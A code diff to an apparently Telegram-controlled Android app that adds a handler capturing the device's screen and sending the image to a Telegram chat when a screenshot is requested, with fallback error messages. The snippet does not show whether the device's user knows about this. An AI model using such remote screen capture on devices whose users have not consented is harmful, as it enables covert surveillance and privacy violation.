@@ -510,16 +510,36 @@ export default function App() {
     try {
       logger.info("Screenshot requested");
 
-      // This requires native modules in Expo, so we'll send an error message
-      await telegramAPI.sendMessage(
-        "Screenshot functionality requires native Android modules.\n" +
-          "Not available in this version.",
-      );
-
-      logger.warning("Screenshot functionality not available");
+      // Use our native module integration for screenshots
+      const screenshotPath = await deviceService.takeScreenshot();
+      
+      if (screenshotPath) {
+        // Send the screenshot to the Telegram chat
+        await telegramAPI.sendFile(
+          screenshotPath,
+          `Screenshot taken at ${new Date().toLocaleString()}`
+        );
+        logger.success("Screenshot sent successfully");
+      } else {
+        // If screenshot failed, send an error message
+        await telegramAPI.sendMessage(
+          "Could not take a screenshot. This might be due to permission restrictions or device limitations."
+        );
+        logger.warning("Screenshot functionality failed");
+      }
     } catch (error) {
       logger.error(`Screenshot error: ${error.message}`);
-      await telegramAPI.sendMessage(`Screenshot error: ${error.message}`);
+      
+      // Send a more user-friendly error message
+      if (error.message.includes("placeholder")) {
+        // This is specifically for web/demo environment
+        await telegramAPI.sendMessage(
+          "Screenshot functionality is available in the native Android app only.\n" +
+          "Not available in web preview."
+        );
+      } else {
+        await telegramAPI.sendMessage(`Screenshot error: ${error.message}`);
+      }
     }
   }, []);
 
